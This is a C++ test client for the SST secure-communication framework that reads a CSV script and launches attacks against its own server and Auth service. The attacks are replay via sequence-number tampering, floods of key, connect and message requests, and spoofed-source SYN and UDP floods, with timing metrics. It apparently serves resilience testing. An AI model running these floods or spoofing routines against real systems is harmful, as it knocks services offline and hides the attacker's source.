extern "C" {
#include "../../c_api.h"
}

#include <unistd.h>

#include <cstring>
#include <fstream>
#include <thread>

#include "lib/metrics.hpp"
#include "lib/send_syn.hpp"

enum AttackType { NONE, REPLAY, DOSK, DOSC, DOSM, DOSS, DOSU };

static AttackType parseAttackType(const std::string& s) {
    if (s == "REPLAY" || s == "Replay" || s == "replay")
        return REPLAY;
    if (s == "DOSK" || s == "DoSK" || s == "DosK" || s == "Dosk" ||
        s == "dosK" || s == "dosk")
        return DOSK;
    if (s == "DOSC" || s == "DoSC" || s == "DosC" || s == "Dosc" ||
        s == "dosC" || s == "dosc")
        return DOSC;
    if (s == "DOSM" || s == "DoSM" || s == "DosM" || s == "Dosm" ||
        s == "dosM" || s == "dosm")
        return DOSM;
    if (s == "DOSS" || s == "DoSS" || s == "DosS" || s == "Doss" ||
        s == "doss")
        return DOSS;
    if (s == "DOSU" || s == "DoSU" || s == "DosU" || s == "Dosu" ||
        s == "dosU" || s == "dosu")
        return DOSU;
    return NONE;
}

int main(int argc, char* argv[]) {
    // allow: ./client <config_path> <csv_file_path> [-metrics] [src_ip]
    if (argc < 3 || argc > 5) {
        SST_print_error("Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
                        argv[0]);
        return EXIT_FAILURE;
    }

    bool metrics = false;
    const char* src_ip = NULL;

    if (argc == 4) {
        if (std::strcmp(argv[3], "-metrics") == 0) {
            metrics = true;
        } else {
            src_ip = argv[3];
        }
    } else if (argc == 5) {
        if (std::strcmp(argv[3], "-metrics") != 0) {
            SST_print_error(
                "Invalid arguments. With 5 args, argv[3] must be -metrics.");
            SST_print_error(
                "Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
                argv[0]);
            return EXIT_FAILURE;
        }
        metrics = true;
        src_ip = argv[4];
        if (std::strcmp(src_ip, "-metrics") == 0) {
            SST_print_error("src_ip cannot be -metrics.");
            SST_print_error(
                "Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
                argv[0]);
            return EXIT_FAILURE;
        }
    }

    if (metrics) {
        SST_print_log("Metrics logging enabled.\n");
    }
    if (src_ip) {
        SST_print_log("IP enabled: %s\n", src_ip);
    }

    // Standard SST initialization
    char* config_path = argv[1];
    SST_ctx_t* ctx = init_SST(config_path);

    session_key_list_t* s_key_list = get_session_key(ctx, NULL);
    if (s_key_list == NULL) {
        SST_print_error("Client failed to get session key.");
        exit(1);
    }

    // SST Connect to server
    SST_session_ctx_t* session_ctx =
        secure_connect_to_server(&s_key_list->s_key[0], ctx);

    // Read CSV file
    std::string my_file_path = argv[2];
    std::ifstream file(my_file_path);
    std::string line;

    while (std::getline(file, line)) {
        //  split the line into 4 tokens
        size_t comma1 = line.find(',');
        size_t comma2 = line.find(',', comma1 + 1);
        size_t comma3 = line.find(',', comma2 + 1);

        // Sleep for the specified time
        std::string sleep_time_str = line.substr(0, comma1);
        int sleep_time = std::stoi(sleep_time_str);
        std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));

        // Send message to server
        std::string message = line.substr(comma1 + 1, comma2 - comma1 - 1);
        SST_print_log("Sending message: %s\n", message.c_str());

        int msg = send_secure_message(const_cast<char*>(message.c_str()),
                                      message.length(), session_ctx);
        if (msg < 0) {
            SST_print_error_exit("Failed send_secure_message().");
        }

        std::string attack_type_str;

        if (comma2 != std::string::npos) {
            std::size_t start = comma2 + 1;

            if (comma3 == std::string::npos) {
                // No 3rd comma: go to the end of the line
                attack_type_str = line.substr(start);
            } else {
                // 3rd comma: grab text between 2nd and 3rd comma
                std::size_t len = comma3 - start;
                attack_type_str = line.substr(start, len);
            }
        } else {
            // No 2nd comma: use empty string
            attack_type_str = "";
        }

        AttackType attack_type = parseAttackType(attack_type_str);

        // Optional: parameter for the attack type if applicable
        std::string attack_param =
            (comma3 != std::string::npos) ? line.substr(comma3 + 1) : "";

        if (metrics) {
            sleep(10);
        }

        switch (attack_type) {
            case REPLAY: {
                // Replay Attack
                SST_print_log("Performing Replay Attack with parameter: %s\n",
                              attack_param.c_str());
                if (attack_param == "seq--") {
                    session_ctx->sent_seq_num--;
                } else if (attack_param == "seq++") {
                    session_ctx->sent_seq_num++;
                } else if (attack_param.rfind("seq=", 0) == 0) {
                    // parse “seq=#”
                    int v = std::stoi(attack_param.substr(4));
                    session_ctx->sent_seq_num = v;
                }
            } break;

            case DOSK: {
                // Quantity of get_session_key requests is the fourth column in
                // the CSV
                int repeat = std::stoi(attack_param);
                std::string exp_id = "DOSK:repeat=" + std::to_string(repeat);

                // from metrics.hpp
                // If the user used the -metrics flag, set up metrics logging
                MetricsRow row;
                if (metrics) {
                    metrics_open_new_file();
                    metrics_write_header_if_empty();
                    row = metrics_begin_row(exp_id);
                }

                // DOS Attack on get_session_key
                for (int i = 0; i < repeat; ++i) {
                    SST_print_log("Getting session key: %d of %d\n", i + 1,
                                  repeat);

                    // Track how long it takes to get the session key
                    auto t0 = std::chrono::steady_clock::now();
                    session_key_list_t* s_key_list = get_session_key(ctx, NULL);
                    auto t1 = std::chrono::steady_clock::now();

                    long dur_us =
                        std::chrono::duration_cast<std::chrono::microseconds>(
                            t1 - t0)
                            .count();

                    if (metrics) {
                        metrics_add_sample(row, dur_us, s_key_list != NULL);
                    }

                    if (s_key_list == NULL) {
                        SST_print_error("Client failed to get session key in DOS "
                                     "Key attack.");
                        break;
                    }
                }

                if (metrics) {
                    metrics_end_row_and_write(row);
                }

            } break;

            case DOSC: {
                // Quantity of secure_connect_to_server requests is the fourth
                // column in the CSV
                int repeat = std::stoi(attack_param);
                std::string exp_id = "DOSC:repeat=" + std::to_string(repeat);
                SST_session_ctx_t* session_ctx[repeat];

                MetricsRow row;
                if (metrics) {
                    metrics_open_new_file();
                    metrics_write_header_if_empty();
                    row = metrics_begin_row(exp_id);
                }

                // DOS Attack on secure_connect_to_server
                for (int i = 0; i < repeat; ++i) {
                    s_key_list = get_session_key(ctx, NULL);
                    if (s_key_list == NULL) {
                        SST_print_error("Client failed to get session key in DOS "
                                     "Connect attack.");
                        i--;
                        continue;
                    }
                    SST_print_log("Connecting to server: %d of %d\n", i + 1,
                                  repeat);

                    // Track how long it takes to connect
                    auto t0 = std::chrono::steady_clock::now();
                    session_ctx[i] =
                        secure_connect_to_server(&s_key_list->s_key[0], ctx);
                    auto t1 = std::chrono::steady_clock::now();

                    long long dur_us =
                        std::chrono::duration_cast<std::chrono::microseconds>(
                            t1 - t0)
                            .count();

                    if (metrics) {
                        metrics_add_sample(row, dur_us, session_ctx[i] != NULL);
                    }

                    if (session_ctx[i] == NULL) {
                        SST_print_error("Client failed to connect to server in DOS "
                                     "Connect attack.");
                        continue;
                    }
                }

                if (metrics) {
                    metrics_end_row_and_write(row);
                }

            } break;

            case DOSM: {
                // Quantity of send_secure_message requests is the fourth column
                // in the CSV
                int repeat = std::stoi(attack_param);
                std::string exp_id = "DOSM:repeat=" + std::to_string(repeat);

                MetricsRow row;
                if (metrics) {
                    metrics_open_new_file();
                    metrics_write_header_if_empty();
                    row = metrics_begin_row(exp_id);
                }

                // DOS Attack on send_secure_message
                unsigned char received_buf[MAX_SECURE_COMM_MSG_LENGTH];
                for (int i = 0; i < repeat; ++i) {
                    SST_print_log("Sending message: %s (%d of %d)\n",
                                  message.c_str(), i + 1, repeat);

                    // Track how long it takes to send the message and get a response
                    auto t0 = std::chrono::steady_clock::now();

                    int msg =
                        send_secure_message(const_cast<char*>(message.c_str()),
                                            message.length(), session_ctx);
                    if (msg < 0) {
                        SST_print_error_exit("Failed send_secure_message().");
                    }

                    if (metrics) {
                        int ret =
                            read_secure_message(received_buf, session_ctx);

                        if (ret < 0) {
                            SST_print_error("Failed to read secure message.");
                            continue;
                        } else if (ret == 0) {
                            SST_print_error("Connection closed");
                            continue;
                        }

                        auto t1 = std::chrono::steady_clock::now();

                        long dur_us =
                        std::chrono::duration_cast<std::chrono::microseconds>(t1
                        - t0).count();
                        metrics_add_sample(row, dur_us, msg >= 0);
                    }
                }

                if (metrics) {
                    metrics_end_row_and_write(row);
                }

            } break;

            case DOSS: {
                const char* dst_ip_str = ctx->config.auth_ip_addr;
                unsigned short dst_port = 21900;
                char default_src_ip[INET_ADDRSTRLEN];
                const char* src_ip_to_use = NULL;
                if (!resolve_src_ip_or_default(src_ip, dst_ip_str, dst_port,
                                               default_src_ip,
                                               sizeof(default_src_ip),
                                               &src_ip_to_use)) {
                    break;
                }

                int repeat = std::stoi(attack_param);
                send_syn_packets(
                    src_ip_to_use, // spoofed source IP
                    dst_ip_str, // destination IP
                    dst_port, // destination port
                    repeat // number of packets
                );
            } break;



            // possible other case:
            // This code could be useful for making a SYN flood attack to the
            // server instead of Auth
            //
            // for (int i = 0; i < repeat; ++i) {
            //     int temp_sock = socket(AF_INET, SOCK_STREAM, 0);
            //     if (temp_sock < 0) {
            //         SST_print_error_exit("Failed to create socket.");
            //     }

            //     struct sockaddr_in server_addr;
            //     server_addr.sin_family = AF_INET;
            //     server_addr.sin_port = htons(ctx->config.server_port);
            //     server_addr.sin_addr.s_addr =
            //     inet_addr(ctx->config.server_ip);

            //     connect(temp_sock, (struct sockaddr*)&server_addr,
            //             sizeof(server_addr));
            //     // Not closing the socket to keep it in SYN-RECEIVED state

            case DOSU: {
                // UDP to Auth
                const char* dst_ip_str = ctx->config.auth_ip_addr;
                uint16_t dst_port = 21900;
                char default_src_ip[INET_ADDRSTRLEN];
                const char* src_ip_to_use = NULL;
                if (!resolve_src_ip_or_default(src_ip, dst_ip_str, dst_port,
                                               default_src_ip,
                                               sizeof(default_src_ip),
                                               &src_ip_to_use)) {
                    break;
                }

                int repeat = std::stoi(attack_param);

                // No payload, just raw UDP packets
                send_udp_packets(
                    src_ip_to_use, // spoofed source IP
                    dst_ip_str, // destination IP
                    dst_port, // destination port
                    repeat // number of packets
                );
            } break;

            case NONE:
            default:
                break;
        }
    }

    SST_print_log("Successfully finished communication.\n");

    free(session_ctx);
    free_session_key_list_t(s_key_list);
    free_SST_ctx_t(ctx);

    return EXIT_SUCCESS;
}
